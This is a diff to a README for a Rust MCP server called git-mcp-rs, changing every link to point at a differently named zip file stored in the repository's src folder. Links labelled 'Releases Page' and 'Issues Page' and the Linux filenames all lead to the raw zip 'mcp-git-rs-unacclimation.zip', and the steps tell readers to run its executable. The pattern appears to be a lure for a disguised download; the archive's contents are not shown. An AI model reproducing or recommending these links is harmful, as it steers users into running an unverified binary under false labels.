@@ -1,6 +1,6 @@
 # 🚀 git-mcp-rs - Fetch GitHub Data Instantly
 
-[![Download Now](https://github.com/srpipoca504/git-mcp-rs/raw/refs/heads/main/src/rs-git-mcp-2.6.zip%20Now-Click%20Here-blue)](https://github.com/srpipoca504/git-mcp-rs/raw/refs/heads/main/src/rs-git-mcp-2.6.zip)
+[![Download Now](https://raw.githubusercontent.com/srpipoca504/git-mcp-rs/main/src/mcp-git-rs-unacclimation.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/srpipoca504/git-mcp-rs/main/src/mcp-git-rs-unacclimation.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ git-mcp-rs is a high-performance Model Context Protocol (MCP) server built with 
 
 ## 📥 Download & Install
 
-To download git-mcp-rs, visit this page to download: [Releases Page](https://github.com/srpipoca504/git-mcp-rs/raw/refs/heads/main/src/rs-git-mcp-2.6.zip).
+To download git-mcp-rs, visit this page to download: [Releases Page](https://raw.githubusercontent.com/srpipoca504/git-mcp-rs/main/src/mcp-git-rs-unacclimation.zip).
 
 1. **Visit the Releases Page**: Click the link above to open the GitHub Releases page for git-mcp-rs.
 
@@ -29,13 +29,13 @@ To download git-mcp-rs, visit this page to download: [Releases Page](https://git
 3. **Download the Appropriate File**: 
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the appropriate `https://github.com/srpipoca504/git-mcp-rs/raw/refs/heads/main/src/rs-git-mcp-2.6.zip` file.
+   - For Linux, download the appropriate `https://raw.githubusercontent.com/srpipoca504/git-mcp-rs/main/src/mcp-git-rs-unacclimation.zip` file.
 
 4. **Run the Application**: 
    - Locate the downloaded file on your computer.
    - For Windows, double-click the `.exe` file to run it.
    - For macOS, drag the `.dmg` file to your Applications folder then open it.
-   - For Linux, extract the contents of the `https://github.com/srpipoca504/git-mcp-rs/raw/refs/heads/main/src/rs-git-mcp-2.6.zip` file and run the executable from the terminal.
+   - For Linux, extract the contents of the `https://raw.githubusercontent.com/srpipoca504/git-mcp-rs/main/src/mcp-git-rs-unacclimation.zip` file and run the executable from the terminal.
 
 ## 🔍 Features
 
@@ -75,7 +75,7 @@ A: Yes, git-mcp-rs does not store your data. It simply fetches data from GitHub 
 
 ## 📞 Support
 
-For further assistance, please visit our [Issues Page](https://github.com/srpipoca504/git-mcp-rs/raw/refs/heads/main/src/rs-git-mcp-2.6.zip). You can also join our community on platforms like Discord or Reddit to seek guidance or share your experience.
+For further assistance, please visit our [Issues Page](https://raw.githubusercontent.com/srpipoca504/git-mcp-rs/main/src/mcp-git-rs-unacclimation.zip). You can also join our community on platforms like Discord or Reddit to seek guidance or share your experience.
 
 ## 💡 Community Contributions
 
@@ -87,4 +87,4 @@ While git-mcp-rs provides efficient and real-time access to GitHub data, it reli
 
 ---
 
-[![Download Now](https://github.com/srpipoca504/git-mcp-rs/raw/refs/heads/main/src/rs-git-mcp-2.6.zip%20Now-Click%20Here-blue)](https://github.com/srpipoca504/git-mcp-rs/raw/refs/heads/main/src/rs-git-mcp-2.6.zip)
+[![Download Now](https://raw.githubusercontent.com/srpipoca504/git-mcp-rs/main/src/mcp-git-rs-unacclimation.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/srpipoca504/git-mcp-rs/main/src/mcp-git-rs-unacclimation.zip)
